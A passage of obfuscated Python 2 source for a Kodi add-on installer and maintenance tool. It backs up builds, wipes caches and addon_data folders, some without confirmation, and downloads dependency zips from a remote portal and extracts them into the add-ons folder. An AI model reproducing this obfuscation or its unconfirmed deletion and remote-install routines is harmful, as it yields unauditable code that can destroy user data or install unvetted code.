   if 34 - 34: II111iiii % I1IiiI % IIi + Oo0Ooo - OoOoOO00
  o00OO0o0 = urllib . quote_plus ( I1iII1IIi1IiI )
 OOooO0OOoo . create ( 'Backing Up Addons & Repositories' , '' , 'Please Wait...' )
 if 66 - 66: O00OOo00oo0o * iIii1I11I1II1 - iiiiiiii1 / I1IiiI
 if not os . path . exists ( O0o0O00Oo0o0 ) :
  os . makedirs ( O0o0O00Oo0o0 )
  if 62 - 62: IIiiiI1iIII . O0 . iIii1I11I1II1
  if 94 - 94: iiiiiiii1 % OOOoOoo0O % i1IIi
 for ooo0O in os . listdir ( II11iiii1Ii ) :
  if not 'metadata' in ooo0O and not 'module' in ooo0O and not 'script.common' in ooo0O and not 'packages' in ooo0O and not 'service.xbmc.versioncheck' in ooo0O and os . path . isdir ( os . path . join ( II11iiii1Ii , ooo0O ) ) :
   try :
    OOooO0OOoo . update ( 0 , "Backing Up" , '[COLOR yellow]%s[/COLOR]' % ooo0O , 'Please Wait...' )
    if 90 - 90: O00OOo00oo0o * OoO0O00
    if 7 - 7: IIiIi1iI . O00OOo00oo0o . IIiIi1iI - IIi
    if ooo0O in iii1 or url != 'create_pack' :
     if 33 - 33: iiiiiiii1 + OoooooooOO - OoO0O00 / i1IIi / OoooooooOO
     if not os . path . exists ( os . path . join ( O0o0O00Oo0o0 , 'addons' , ooo0O ) ) :
      os . makedirs ( os . path . join ( O0o0O00Oo0o0 , 'addons' , ooo0O ) )
     shutil . copyfile ( os . path . join ( II11iiii1Ii , ooo0O , 'addon.xml' ) , os . path . join ( O0o0O00Oo0o0 , 'addons' , ooo0O , 'addon.xml' ) )
    if not ooo0O in iii1 :
     shutil . copytree ( os . path . join ( II11iiii1Ii , ooo0O ) , os . path . join ( O0o0O00Oo0o0 , 'addons' , ooo0O ) )
     if 82 - 82: I1ii11iIi11i / Oo - IIiIi1iI / Oo0Ooo * OoO0O00
    o00O = os . path . join ( O0o0O00Oo0o0 , 'addons' , ooo0O , 'addon.xml' )
    if 50 - 50: OoOoOO00 - ooOo + iIii1I11I1II1 - OoO0O00 . Oo0Ooo
    if 8 - 8: O00OOo00oo0o
    if 30 - 30: i1IIi
    IIiIiI = open ( o00O , mode = 'r' )
    ii1I1 = IIiIiI . read ( )
    IIiIiI . close ( )
    if 61 - 61: IIi / IIi
    if 26 - 26: IIiiiI1iIII . O0 * IIiiiI1iIII - o0oOOo0O0Ooo * Oo0Ooo
    OooOooO0O0o0 = re . compile ( '<addon[\s\S]*?">' ) . findall ( ii1I1 )
    IIIIII111Ii = OooOooO0O0o0 [ 0 ] if ( len ( OooOooO0O0o0 ) > 0 ) else 'None'
    II1 = re . compile ( 'version="[\s\S]*?"' ) . findall ( IIIIII111Ii )
    iiI1iI = II1 [ 0 ] if ( len ( II1 ) > 0 ) else '0'
    if 74 - 74: IIiiiI1iIII - O0 / IIi * O00OOo00oo0o % iiiiiiii1 . IIi
    if 60 - 60: I1ii11iIi11i . II111iiii * i11iIiiIii . o0oOOo0O0Ooo
    o00ooO000Oo00 = str ( IIIIII111Ii ) . replace ( iiI1iI , 'version="0.0.0.1"' )
    OOO = ii1I1 . replace ( IIIIII111Ii , o00ooO000Oo00 )
    if 43 - 43: OoO0O00 . iiiiiiii1 * Oo0Ooo
    i1iiI = open ( o00O , mode = 'w' )
    i1iiI . write ( str ( OOO ) )
    i1iiI . close ( )
    if 20 - 20: i1IIi . i1IIi - OOOoOoo0O
   except :
    if oOOoo00O0O == 'true' :
     print "### Failed to create: " + ooo0O + ' ###'
     if 89 - 89: iiiiiiii1 - OOOoOoo0O . O0 % OoooooooOO . i11iIiiIii
 if url == 'create_pack' :
  IIiii11ii1II1 = [ '.svn' , '.git' ]
  o0OO000O = [ '.DS_Store' , 'Thumbs.db' , '.gitignore' ]
  IiIIiII1I = os . path . join ( IiOo00O0o0O , o00OO0o0 + '.zip' )
  iiIIii ( O0o0O00Oo0o0 , IiIIiII1I , 'Creating Addons Archive' , '' , '' , '' , IIiii11ii1II1 , o0OO000O )
  try :
   shutil . rmtree ( O0o0O00Oo0o0 )
  except :
   pass
  iI111I11I1I1 . ok ( 'New Keyword Created' , 'Please read the instructions on how to share this keyword with the community. Your zip file can be found at:' , '[COLOR=dodgerblue]' + IiIIiII1I + '[/COLOR]' )
  if 92 - 92: IIi % O00OOo00oo0o
  if 30 - 30: II111iiii - o0oOOo0O0Ooo % IIi . OOOoOoo0O
def oo0o ( name ) :
 if 75 - 75: IIiIi1iI + iIii1I11I1II1
 I1I1IIiiii1ii = open ( O000oo0O , mode = 'r' )
 ii1I1 = I1I1IIiiii1ii . read ( )
 I1I1IIiiii1ii . close ( )
 i1iOO = re . compile ( 'name="(.+?)"' ) . findall ( ii1I1 )
 OO00OoooO = i1iOO [ 0 ] if ( len ( i1iOO ) > 0 ) else 'None'
 II111IiiiI1 = [ ]
 if 98 - 98: OoOoOO00 - OoOoOO00 . II111iiii . IIiIi1iI + O0
 if 28 - 28: IIiiiI1iIII + i11iIiiIii + OoooooooOO / OoO0O00
 if OO00OoooO == 'None' or OO00OoooO == 'unknown' :
  O0i1I11I = 0
  iI111I11I1I1 . ok ( 'No Profile Set' , "There's no profile name set to the build you're currently running. Please enter a name for this build so we can save it and make sure no data is lost." )
  I1iII1IIi1IiI = iIioo0ooO ( heading = "Enter a name for this backup" )
  if ( not I1iII1IIi1IiI ) :
   return False , 0
  I1iII1IIi1IiI = I1iII1IIi1IiI . replace ( ' ' , '_' )
  o00OO0o0 = urllib . quote_plus ( I1iII1IIi1IiI )
  if os . path . exists ( os . path . join ( II , o00OO0o0 ) ) :
   O0i1I11I = 0
   while not O0i1I11I :
    iI111I11I1I1 . ok ( 'PROFILE ALREADY EXISTS' , "There is already a profile on your system with this name. Please choose another name for this profile." )
    I1iII1IIi1IiI = iIioo0ooO ( heading = "Enter a name for existing profile" )
    if ( not I1iII1IIi1IiI ) :
     return False , 0
    I1iII1IIi1IiI = I1iII1IIi1IiI . replace ( ' ' , '_' )
    o00OO0o0 = urllib . quote_plus ( I1iII1IIi1IiI )
    if not os . path . exists ( os . path . join ( II , o00OO0o0 ) ) :
     O0i1I11I = 1
     if 6 - 6: I1IiiI - i11iIiiIii
  os . makedirs ( os . path . join ( II , o00OO0o0 ) )
  O00O0O0OO00oo = o00OO0o0
  I1I1IIiiii1ii = open ( O000oo0O , 'w' )
  OOO = ii1I1 . replace ( 'id="None"' , 'id="Local"' ) . replace ( 'name="None"' , 'name="' + str ( O00O0O0OO00oo ) + '"' )
  I1I1IIiiii1ii . write ( OOO )
  I1I1IIiiii1ii . close ( )
  if 39 - 39: IIiiiI1iIII % OoOoOO00 * I1ii11iIi11i - OoooooooOO - Oo0Ooo
  if 75 - 75: i11iIiiIii . iiiiiiii1 % i1IIi . I1IiiI - ooOo + Oo0Ooo
  for i1II1 in os . listdir ( OO0o ) :
   II111IiiiI1 . append ( i1II1 )
   if 66 - 66: ooOo % I1ii11iIi11i . II111iiii / OoOoOO00 / OoO0O00
  I1ii1iI = open ( os . path . join ( II , o00OO0o0 , 'addonlist' ) , mode = 'w+' )
  for i1II1 in os . listdir ( II11iiii1Ii ) :
   if not i1II1 in II111IiiiI1 and i1II1 != 'plugin.program.totalinstaller' and i1II1 != 'packages' :
    I1ii1iI . write ( i1II1 + '|' )
  I1ii1iI . close ( )
  if 32 - 32: OoooooooOO
  ii111iI1i1 = [ 'addons' , 'cache' , 'CP_Profiles' , 'system' , 'temp' , 'Thumbnails' ]
  OO000 = [ "xbmc.log" , "xbmc.old.log" , "kodi.log" , "kodi.old.log" , '.DS_Store' , '.setup_complete' , 'XBMCHelper.conf' , '.gitignore' , 'addons*.db' , 'textures13.db' ]
  oO0oOoo0O = "Creating backup of existing build"
  II1iI11 = "Archiving..."
  O00o0O = ""
  O00oOo0O0o00O = "Please Wait"
  iiIIii ( iIii1 , os . path . join ( II , o00OO0o0 , 'build.zip' ) , oO0oOoo0O , II1iI11 , O00o0O , O00oOo0O0o00O , ii111iI1i1 , OO000 )
  if 77 - 77: iIii1I11I1II1 * ooOo
  if 15 - 15: iIii1I11I1II1 . Oo . I1ii11iIi11i * i11iIiiIii
  if 72 - 72: OOOoOoo0O
 else :
  O00O0O0OO00oo = OO00OoooO . replace ( ' ' , '_' ) . replace ( ':' , '-' ) . replace ( "'" , '' )
  if 26 - 26: IIiiiI1iIII % Oo0Ooo
  I1ii1iI = open ( os . path . join ( II , O00O0O0OO00oo , 'addonlist' ) , mode = 'w+' )
  for i1II1 in os . listdir ( II11iiii1Ii ) :
   if not i1II1 in II111IiiiI1 and i1II1 != 'plugin.program.totalinstaller' and i1II1 != 'packages' :
    I1ii1iI . write ( i1II1 + '|' )
  I1ii1iI . close ( )
  if 72 - 72: O0 + o0oOOo0O0Ooo + I1IiiI / Oo0Ooo
  ii111iI1i1 = [ 'addons' , 'cache' , 'CP_Profiles' , 'system' , 'temp' , 'Thumbnails' ]
  OO000 = [ "xbmc.log" , "xbmc.old.log" , "kodi.log" , "kodi.old.log" , '.DS_Store' , '.setup_complete' , 'XBMCHelper.conf' , '.gitignore' , 'addons*.db' , 'textures13.db' ]
  oO0oOoo0O = "Creating backup of existing build"
  II1iI11 = "Archiving..."
  O00o0O = ""
  O00oOo0O0o00O = "Please Wait"
  iiIIii ( iIii1 , os . path . join ( II , O00O0O0OO00oo , 'build.zip' ) , oO0oOoo0O , II1iI11 , O00o0O , O00oOo0O0o00O , ii111iI1i1 , OO000 )
 return O00O0O0OO00oo
 if 83 - 83: IIiiiI1iIII - I1IiiI . O00OOo00oo0o
 if 34 - 34: OoOoOO00 - ooOo * OoooooooOO
def IiI1I1IIIi1i ( db_path ) :
 global cur
 global con
 con = database . connect ( db_path )
 cur = con . cursor ( )
 if 73 - 73: O0 * IIi . i1IIi
 if 51 - 51: OoO0O00 - IIiIi1iI % O0 - OoOoOO00
def o0ooo ( ) :
 o0oo00O = xbmc . translatePath ( os . path . join ( 'special://home/userdata/addon_data' , '' ) )
 if 36 - 36: Oo * OoO0O00 - I1ii11iIi11i + IIiIi1iI
 for IIIiiiiiI1I , I1III111i , iiI1iii in os . walk ( o0oo00O ) :
  O0oooO00ooO0 = 0
  O0oooO00ooO0 += len ( iiI1iii )
  if 99 - 99: IIiiiI1iIII
  if O0oooO00ooO0 >= 0 :
   if 92 - 92: OoO0O00 + OOOoOoo0O - IIiiiI1iIII . I1ii11iIi11i * iiiiiiii1 - i11iIiiIii
   for IIiI1i in iiI1iii :
    os . unlink ( os . path . join ( IIIiiiiiI1I , IIiI1i ) )
    if 74 - 74: OoO0O00 + IIiIi1iI + II111iiii
   for ii1ii in I1III111i :
    shutil . rmtree ( os . path . join ( IIIiiiiiI1I , ii1ii ) )
    if 48 - 48: OoooooooOO
    if 77 - 77: O0 * I1ii11iIi11i * ooOo + OoO0O00 + I1ii11iIi11i - IIi
def iI1I1I ( ) :
 for ii11 in glob . glob ( os . path . join ( OOOO0OOoO0O0 , 'xbmc_crashlog*.*' ) ) :
  oOOooooO = ii11
  os . remove ( ii11 )
  iI111I11I1I1 = xbmcgui . Dialog ( )
  iI111I11I1I1 . ok ( "Crash Logs Deleted" , "Your old crash logs have now been deleted." )
  if 89 - 89: iiiiiiii1 * O00OOo00oo0o
  if 93 - 93: i1IIi . O00OOo00oo0o * IIi . iiiiiiii1
def O0OooooO0o0O0 ( ) :
 O0iI1I1ii11IIi1 = xbmc . translatePath ( os . path . join ( 'special://home/addons/packages' , '' ) )
 if 100 - 100: Oo0Ooo . O00OOo00oo0o . I1IiiI % II111iiii - ooOo
 for IIIiiiiiI1I , I1III111i , iiI1iii in os . walk ( O0iI1I1ii11IIi1 ) :
  O0oooO00ooO0 = 0
  O0oooO00ooO0 += len ( iiI1iii )
  if 52 - 52: I1IiiI % OoO0O00 * O00OOo00oo0o * IIiIi1iI / Oo
  if O0oooO00ooO0 > 0 :
   if 88 - 88: ooOo
   for IIiI1i in iiI1iii :
    os . unlink ( os . path . join ( IIIiiiiiI1I , IIiI1i ) )
    if 1 - 1: Oo0Ooo
   for ii1ii in I1III111i :
    shutil . rmtree ( os . path . join ( IIIiiiiiI1I , ii1ii ) )
    if 95 - 95: OoooooooOO / OOOoOoo0O % OoooooooOO / iiiiiiii1 * IIiiiI1iIII
    if 75 - 75: O0
def oOoO ( path ) :
 I1i1I1I11IiiI = iI111I11I1I1 . yesno ( 'Are you certain?' , 'This will completely wipe this folder, are you absolutely certain you want to continue? There is NO going back after this!' )
 if I1i1I1I11IiiI == 1 :
  OOooO0OOoo . create ( "Cleaning Folders" , "Wiping..." , '' , 'Please Wait' )
  shutil . rmtree ( path , ignore_errors = True )
  OOooO0OOoo . close ( )
  xbmc . executebuiltin ( 'container.Refresh' )
  if 59 - 59: Oo + I1IiiI / II111iiii / OoOoOO00
  if 80 - 80: OoOoOO00 + iIii1I11I1II1 . IIiiiI1iIII
def ooOoOoo000O0O ( url ) :
 for ooo0O in os . listdir ( II ) :
  if ooo0O != 'Master' and ooo0O != url . replace ( ' ' , '_' ) . replace ( "'" , '' ) . replace ( ':' , '-' ) :
   Ii1I1Ii ( '' , '[COLOR=darkcyan]DELETE[/COLOR] ' + ooo0O . replace ( '_' , ' ' ) , os . path . join ( II , ooo0O ) , 'delete_path' , '' , '' , '' , '' )
   if 42 - 42: o0oOOo0O0Ooo / IIiiiI1iIII
   if 79 - 79: O00OOo00oo0o
def iII1i1 ( ) :
 o0oo00O = xbmc . translatePath ( os . path . join ( 'special://home/userdata/addon_data' , '' ) )
 if 34 - 34: OoO0O00 / OoooooooOO - ooOo / ooOo * I1IiiI
 for IIIiiiiiI1I , I1III111i , iiI1iii in os . walk ( o0oo00O ) :
  O0oooO00ooO0 = 0
  O0oooO00ooO0 += len ( iiI1iii )
  if 61 - 61: OOOoOoo0O
  if O0oooO00ooO0 >= 0 :
   if 81 - 81: OOOoOoo0O
   for IIiI1i in iiI1iii :
    os . unlink ( os . path . join ( IIIiiiiiI1I , IIiI1i ) )
    if 92 - 92: Oo - Oo0Ooo - OoooooooOO / IIiiiI1iIII - i1IIi
   for ii1ii in I1III111i :
    shutil . rmtree ( os . path . join ( IIIiiiiiI1I , ii1ii ) )
    if 81 - 81: i1IIi / IIi % i11iIiiIii . iIii1I11I1II1 * OoOoOO00 + OoooooooOO
    if 31 - 31: i1IIi % II111iiii
def iI1iiI1III1i ( ) :
 OOooO0OOoo . create ( 'Checking dependencies' , '' , 'Please Wait...' )
 Ii1iii11I = [ ]
 if 2 - 2: OoooooooOO - O00OOo00oo0o % ooOo / I1IiiI / o0oOOo0O0Ooo
 for ooo0O in os . listdir ( II11iiii1Ii ) :
  if ooo0O != 'packages' :
   try :
    iiII = os . path . join ( II11iiii1Ii , ooo0O , 'addon.xml' )
    iII1IiiIIIIii = open ( iiII , mode = 'r' )
    oOOO = iII1IiiIIIIii . read ( )
    iII1IiiIIIIii . close ( )
    Iii1IiiII1Ii1 = re . compile ( 'import addon="(.+?)"' ) . findall ( oOOO )
    if 26 - 26: OoooooooOO + I1IiiI
    for Ii1iI111 in Iii1IiiII1Ii1 :
     if 57 - 57: Oo . O00OOo00oo0o % o0oOOo0O0Ooo
     if not 'xbmc.python' in Ii1iI111 and not Ii1iI111 in Ii1iii11I :
      Ii1iii11I . append ( Ii1iI111 )
      print 'Script Requires --- ' + Ii1iI111
   except :
    pass
    if 32 - 32: OOOoOoo0O / IIiiiI1iIII - O0 * iIii1I11I1II1
 return Ii1iii11I
 if 70 - 70: OoooooooOO % OoooooooOO % OoO0O00
 if 98 - 98: OoO0O00
def ii111Ii11iii ( name , addon_id ) :
 Ii1I11I = 1
 o00o = 1
 iiII = xbmc . translatePath ( os . path . join ( II11iiii1Ii , addon_id , 'addon.xml' ) )
 iII1IiiIIIIii = open ( iiII , mode = 'r' )
 oOOO = iII1IiiIIIIii . read ( )
 iII1IiiIIIIii . close ( )
 Iii1IiiII1Ii1 = re . compile ( 'import addon="(.+?)"' ) . findall ( oOOO )
 if 18 - 18: OOOoOoo0O + Oo0Ooo - OoO0O00 / IIi / Oo
 for Ii1iI111 in Iii1IiiII1Ii1 :
  if 53 - 53: Oo + o0oOOo0O0Ooo . ooOo / OOOoOoo0O
  if not 'xbmc.python' in Ii1iI111 :
   print 'Script Requires --- ' + Ii1iI111
   o0000oO = xbmc . translatePath ( os . path . join ( II11iiii1Ii , Ii1iI111 ) )
   if 83 - 83: OoO0O00
   if not os . path . exists ( o0000oO ) :
    i1I1i1 = 'http://noobsandnerds.com/TI/AddonPortal/dependencyinstall.php?id=%s' % ( Ii1iI111 )
    O0OoooO0 = ooo0O0o00O ( i1I1i1 , 10 ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
    oOooo0 = re . compile ( 'name="(.+?)"' ) . findall ( O0OoooO0 )
    OO0o0oOOO0O = re . compile ( 'version="(.+?)"' ) . findall ( O0OoooO0 )
    oOIIiIi = re . compile ( 'repo_url="(.+?)"' ) . findall ( O0OoooO0 )
    OOoOooOoOOOoo = re . compile ( 'data_url="(.+?)"' ) . findall ( O0OoooO0 )
    Iiii1iI1i = re . compile ( 'zip_url="(.+?)"' ) . findall ( O0OoooO0 )
    O0O0Oo00 = re . compile ( 'repo_id="(.+?)"' ) . findall ( O0OoooO0 )
    iii1IiiIiIIiI = oOooo0 [ 0 ] if ( len ( oOooo0 ) > 0 ) else ''
    oOOo0oo0O = OO0o0oOOO0O [ 0 ] if ( len ( OO0o0oOOO0O ) > 0 ) else ''
    o0OoOOoOOoo = oOIIiIi [ 0 ] if ( len ( oOIIiIi ) > 0 ) else ''
    oo0O0 = OOoOooOoOOOoo [ 0 ] if ( len ( OOoOooOoOOOoo ) > 0 ) else ''
    Ii111Ii11 = Iiii1iI1i [ 0 ] if ( len ( Iiii1iI1i ) > 0 ) else ''
    Ii1II = O0O0Oo00 [ 0 ] if ( len ( O0O0Oo00 ) > 0 ) else ''
    IIiII = xbmc . translatePath ( os . path . join ( OOO00O , iii1IiiIiIIiI + '.zip' ) )
    if 39 - 39: o0oOOo0O0Ooo / IIiiiI1iIII - IIiIi1iI
    OOooO0OOoo . create ( 'Downloading Dependencies' , 'Installing [COLOR=yellow]' + iii1IiiIiIIiI , '' , '' )
    if 96 - 96: OOOoOoo0O * I1ii11iIi11i * O00OOo00oo0o + I1ii11iIi11i % I1IiiI + i11iIiiIii
    try :
     downloader . download ( o0OoOOoOOoo , IIiII , OOooO0OOoo )
     extract . all ( IIiII , II11iiii1Ii , OOooO0OOoo )
     if 37 - 37: OOOoOoo0O % I1ii11iIi11i / iiiiiiii1
    except :
     if 94 - 94: OOOoOoo0O / OoO0O00 . o0oOOo0O0Ooo
     try :
      downloader . download ( Ii111Ii11 , IIiII , OOooO0OOoo )
      extract . all ( IIiII , II11iiii1Ii , OOooO0OOoo )
      if 1 - 1: Oo0Ooo . II111iiii
     except :
      if 93 - 93: II111iiii . i11iIiiIii + II111iiii % ooOo
      try :
       if 98 - 98: IIi * ooOo * OoOoOO00 + O00OOo00oo0o * IIiIi1iI
       if not os . path . exists ( o0000oO ) :
        os . makedirs ( o0000oO )
        if 4 - 4: IIiiiI1iIII
       O0OoooO0 = ooo0O0o00O ( oo0O0 , 10 ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
       o0OO000ooOo = re . compile ( 'href="(.+?)"' , re . DOTALL ) . findall ( O0OoooO0 )
       if 16 - 16: iIii1I11I1II1 * IIiIi1iI + ooOo . O0 . o0oOOo0O0Ooo
       for OooO0oOo in o0OO000ooOo :
        oOOo00O0OOOo = xbmc . translatePath ( os . path . join ( o0000oO , OooO0oOo ) )
        if 99 - 99: i11iIiiIii - IIiIi1iI
        if addon_id not in OooO0oOo and '/' not in OooO0oOo :
         if 85 - 85: IIi % I1ii11iIi11i
         try :
          OOooO0OOoo . update ( 0 , '' , 'Downloading [COLOR=yellow]' + OooO0oOo + '[/COLOR]' , 'Please wait...' )
          downloader . download ( oo0O0 + OooO0oOo , oOOo00O0OOOo , OOooO0OOoo )
          if 95 - 95: OoO0O00 * Oo * IIiIi1iI . o0oOOo0O0Ooo
         except :
          print "failed to install" + OooO0oOo
          if 73 - 73: OoO0O00
        if '/' in OooO0oOo and '..' not in OooO0oOo and 'http' not in OooO0oOo :
         O0O00OOo = oo0O0 + OooO0oOo
         OoOOo ( oOOo00O0OOOo , O0O00OOo )
         if 28 - 28: OoooooooOO - OOOoOoo0O
      except :
       iI111I11I1I1 . ok ( "Error downloading dependency" , 'There was an error downloading [COLOR=dodgerblue]' + iii1IiiIiIIiI + '[/COLOR]. Please consider updating the add-on portal with details or report the error on the forum at WWW.NOOBSANDNERDS.COM' )
       o00o = 0
       Ii1I11I = 0
       if 84 - 84: II111iiii
    if o00o == 1 :
     time . sleep ( 1 )
     OOooO0OOoo . update ( 0 , "[COLOR=yellow]" + iii1IiiIiIIiI + '[/COLOR]  [COLOR=lime]Successfully Installed[/COLOR]' , '' , 'Please wait...' )
     time . sleep ( 1 )
     Ooo0Oo0oo0 = 'http://noobsandnerds.com/TI/AddonPortal/downloadcount.php?id=%s' % ( Ii1iI111 )
     try :
      ooo0O0o00O ( Ooo0Oo0oo0 , 5 )
     except :
      pass
 OOooO0OOoo . close ( )
 time . sleep ( 1 )
 if 36 - 36: Oo - OoOoOO00 - iIii1I11I1II1
 if 10 - 10: I1ii11iIi11i / O00OOo00oo0o * i1IIi % O0 + OOOoOoo0O
def I1i1ii1ii ( name , url , buildname , author , version , description , updated , skins , videoaddons , audioaddons , programaddons , pictureaddons , sources , adult ) :
 oOo00Ooo0o0 ( buildname + '     v.' + version , '[COLOR=yellow][B]Author:   [/B][/COLOR]' + author + '[COLOR=yellow][B]               Last Updated:   [/B][/COLOR]' + updated + '[COLOR=yellow][B]               Adult Content:   [/B][/COLOR]' + adult + '[CR][CR][COLOR=yellow][B]Description:[CR][/B][/COLOR]' + description +
 '[CR][CR][COLOR=blue][B]Skins:   [/B][/COLOR]' + skins + '[CR][CR][COLOR=blue][B]Video Addons:   [/B][/COLOR]' + videoaddons + '[CR][CR][COLOR=blue][B]Audio Addons:   [/B][/COLOR]' + audioaddons +
 '[CR][CR][COLOR=blue][B]Program Addons:   [/B][/COLOR]' + programaddons + '[CR][CR][COLOR=blue][B]Picture Addons:   [/B][/COLOR]' + pictureaddons + '[CR][CR][COLOR=blue][B]Sources:   [/B][/COLOR]' + sources +
 '[CR][CR][COLOR=orange]Disclaimer: [/COLOR]These are community builds and they may overwrite some of your existing settings, '
 'It\'s purely the responsibility of the user to choose whether or not they wish to install these builds, the individual who uploads the build should state what\'s included and then it\'s the users decision to decide whether or not that content is suitable for them.' )
 if 32 - 32: IIiiiI1iIII / OoooooooOO
 if 30 - 30: OoOoOO00 / I1IiiI - OoO0O00 - IIiIi1iI - i11iIiiIii
def oo0O00o0 ( path ) :
 OOooO0OOoo . create ( "Cleaning Folders" , "Wiping..." , '' , 'Please Wait' )
 shutil . rmtree ( path , ignore_errors = True )
 if 51 - 51: O0 % II111iiii % i11iIiiIii + Oo . OoooooooOO
 if 14 - 14: Oo0Ooo + i11iIiiIii - ooOo % IIiiiI1iIII
def iIi1iIiIIII1iII1i ( ) :
 Ii1I1Ii ( '' , "[I][B][COLOR red]!!Notice: Disabling Some Addons Can Cause Issues!![/COLOR][/B][/I]" , '' , '' , 'mainmenu/maintenance.png' , '' , '' , '' )
 O0OO00OoO00 = glob . glob ( os . path . join ( II11iiii1Ii , '*/' ) )
 for O00o in sorted ( O0OO00OoO00 , key = lambda Ii11Iiii1iiii : Ii11Iiii1iiii ) :
  if I1IiI in O00o : continue
  iiII = os . path . join ( O00o , 'addon.xml' )
  if os . path . exists ( iiII ) :
   O0OO00OoO00 = O00o . replace ( II11iiii1Ii , '' ) [ 1 : - 1 ]
   IIiI1i = open ( iiII )
   OO0OOoo0OOO = IIiI1i . read ( ) . replace ( '\n' , '' ) . replace ( '\r' , '' ) . replace ( '\t' , '' )
   o0OO000ooOo = re . compile ( '<addo.+?id="(.+?)".+?>' ) . findall ( OO0OOoo0OOO )
   i1IIII1111 = re . compile ( '<addo.+? name="(.+?)".+?>' ) . findall ( OO0OOoo0OOO )
   try :
    Ooo0o0000OO = o0OO000ooOo [ 0 ]
    ooo0O = i1IIII1111 [ 0 ]
   except :
    continue
   try :
    iIiI1II1I1 = xbmcaddon . Addon ( id = Ooo0o0000OO )
    OooiIiI1i1Ii = "[COLOR green][Enabled][/COLOR]"
    Oo0o00o = "false"
   except :
    OooiIiI1i1Ii = "[COLOR red][Disabled][/COLOR]"
    Oo0o00o = "true"
    pass
   I1iii = os . path . join ( O00o , 'icon.png' ) if os . path . exists ( os . path . join ( O00o , 'icon.png' ) ) else Oo00OOOOO
   iiiiII11iIi = os . path . join ( O00o , 'fanart.jpg' ) if os . path . exists ( os . path . join ( O00o , 'fanart.jpg' ) ) else O0o0Oo
   Ii1I1Ii ( 'addon' , "%s %s" % ( OooiIiI1i1Ii , ooo0O ) , "%s[]%s" % ( O0OO00OoO00 , Oo0o00o ) , 'toggleaddon' , I1iii , iiiiII11iIi , '' , '' )
   IIiI1i . close ( )
   if 32 - 32: OoOoOO00 + iiiiiiii1 + O00OOo00oo0o + I1IiiI
def IiiIIiI1iI1 ( ) :
 os . remove ( O000oo0O )
 os . rename ( OOOOi11i1 , O000oo0O )
 xbmc . executebuiltin ( 'UnloadSkin' )
 xbmc . executebuiltin ( "ReloadSkin" )
 iI111I11I1I1 . ok ( "Local Restore Complete" , 'XBMC/Kodi will now close.' , '' , '' )
 xbmc . executebuiltin ( "Quit" )
 if 26 - 26: IIiIi1iI - Oo0Ooo + I1IiiI + o0oOOo0O0Ooo
 if 37 - 37: o0oOOo0O0Ooo * Oo + I1IiiI . I1ii11iIi11i * OoooooooOO
def IiiIIiII11i1 ( url ) :
 OOooO0OOoo . create ( "Changing Physical Paths To Special" , "Renaming paths..." , '' , 'Please Wait' )
 for IIIiiiiiI1I , I1III111i , iiI1iii in os . walk ( url ) :
  for file in iiI1iii :
   if file . endswith ( ".xml" ) or file . endswith ( ".hash" ) or file . endswith ( "properies" ) :
    OOooO0OOoo . update ( 0 , "Fixing" , file , 'Please Wait' )
    OO0OOoo0OOO = open ( ( os . path . join ( IIIiiiiiI1I , file ) ) ) . read ( )
    OoooOO0 = urllib . quote ( iIii1 )
    oo0OoO = urllib . quote ( iIii1 ) . replace ( '%3A' , '%3a' ) . replace ( '%5C' , '%5c' )
    iIIi1iii1 = OO0OOoo0OOO . replace ( iIii1 , 'special://home/' ) . replace ( OoooOO0 , 'special://home/' ) . replace ( oo0OoO , 'special://home/' )
    IIiI1i = open ( ( os . path . join ( IIIiiiiiI1I , file ) ) , mode = 'w' )
    IIiI1i . write ( str ( iIIi1iii1 ) )
    IIiI1i . close ( )
    if 64 - 64: iiiiiiii1 / i1IIi % IIiIi1iI
    if 84 - 84: OoOoOO00 - Oo0Ooo . iiiiiiii1 . IIiiiI1iIII - Oo0Ooo
def o0Oo0oO00Oooo ( ) :
 if os . path . exists ( O0o0O00Oo0o0 ) :
  shutil . rmtree ( O0o0O00Oo0o0 )
 ii111iI1i1 = [ ]
 OO000 = [ "xbmc.log" , "xbmc.old.log" , "kodi.log" , "kodi.old.log" , '.DS_Store' , '.setup_complete' , 'XBMCHelper.conf' , '.gitignore' ]
 oO0oOoo0O = "Creating full backup of existing build"
 O000o0000O = "Creating Community Build"
 II1iI11 = "Archiving..."
 O00o0O = ""
 O00oOo0O0o00O = "Please Wait"
 if 31 - 31: i1IIi * Oo0Ooo % O00OOo00oo0o + OoO0O00
 iiIIii ( iIii1 , myfullbackup , oO0oOoo0O , II1iI11 , O00o0O , O00oOo0O0o00O , ii111iI1i1 , OO000 )
 if 75 - 75: Oo / IIi - II111iiii % i11iIiiIii + OoO0O00
def i1iiiiii1 ( ) :
 OoO0oOOOO = 0
 o0oo00OOOo = os . path . join ( '/private/var/mobile/Library/Caches/AppleTV/Video/' , 'Other' )
 oo0oO = os . path . join ( '/private/var/mobile/Library/Caches/AppleTV/Video/' , 'Localuseraccountnamental' )
 i1i1IIi = os . path . join ( xbmc . translatePath ( 'special://profile/addon_data/script.module.simple.downloader' ) , '' )
 o0oo0Ooo0 = os . path . join ( xbmc . translatePath ( 'special://profile/addon_data/script.image.music.slideshow/cache' ) , '' )
 o0OOoO = os . path . join ( xbmc . translatePath ( 'special://profile/addon_data/plugin.video.iplayer/iplayer_http_cache' ) , '' )
 I1iII1II1I1ii = os . path . join ( xbmc . translatePath ( 'special://profile/addon_data/plugin.video.itv/Images' ) , '' )
 oo0OO0O = os . path . join ( xbmc . translatePath ( 'special://profile/addon_data/script.navi-x/cache' ) , '' )
 OO0OooOOoO00OO00 = os . path . join ( xbmc . translatePath ( 'special://profile/addon_data/plugin.video.phstreams/Cache' ) , '' )
 ii11ii1iIiI1 = os . path . join ( xbmc . translatePath ( 'special://profile/addon_data/plugin.audio.ramfm/cache' ) , '' )
 OoOo0oO0 = os . path . join ( xbmc . translatePath ( 'special://profile/addon_data/plugin.video.whatthefurk/cache' ) , '' )
 i111iIi1i1 = os . path . join ( xbmc . translatePath ( 'special://profile/addon_data/plugin.video.genesis' ) , 'cache.db' )
 IIiiI = os . path . join ( iIii1 , 'temp' )
 OOooO0OOoo . create ( 'Calculating Used Space' , '' , 'Please wait' , '' )
 if 65 - 65: OoOoOO00 . II111iiii % IIiIi1iI + O00OOo00oo0o
 if 37 - 37: ooOo - iIii1I11I1II1 + II111iiii . O00OOo00oo0o % iIii1I11I1II1
 if os . path . exists ( o0oo00OOOo ) :
  OoO0oOOOO = i11iiI ( o0oo00OOOo , OoO0oOOOO )
 if os . path . exists ( oo0oO ) :
